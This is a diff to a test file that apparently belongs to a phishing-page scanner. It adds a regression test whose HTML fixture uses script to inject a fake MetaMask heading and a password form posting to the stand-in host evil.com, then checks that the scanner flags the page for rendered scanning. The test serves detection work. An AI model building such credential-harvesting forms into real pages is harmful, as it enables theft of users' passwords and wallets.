@@ -89,6 +89,19 @@ class TestNeedsRenderedScan:
         result = ScanResult(verdict=Verdict.CLEAN)
         assert _needs_rendered_scan(html, soup, result) is False
 
+    def test_long_script_with_sparse_visible_content_triggers(self):
+        """Page with long script but sparse visible text should still trigger.
+        Regression: soup.get_text() was including script content in length check."""
+        html = """<html><body>
+        <div id="app"></div>
+        <script>
+        document.getElementById('app').innerHTML = '<h1>MetaMask</h1>' + '<form action="https://evil.com"><input type="password"></form>' + 'x'.repeat(500);
+        </script>
+        </body></html>"""
+        soup = parse_html(html)
+        result = ScanResult(verdict=Verdict.CLEAN)
+        assert _needs_rendered_scan(html, soup, result) is True
+
     def test_suspicious_also_skipped(self):
         """SUSPICIOUS verdicts also skip render (already flagged)."""
         soup = parse_html(JS_RENDERED_PHISHING_SHELL)
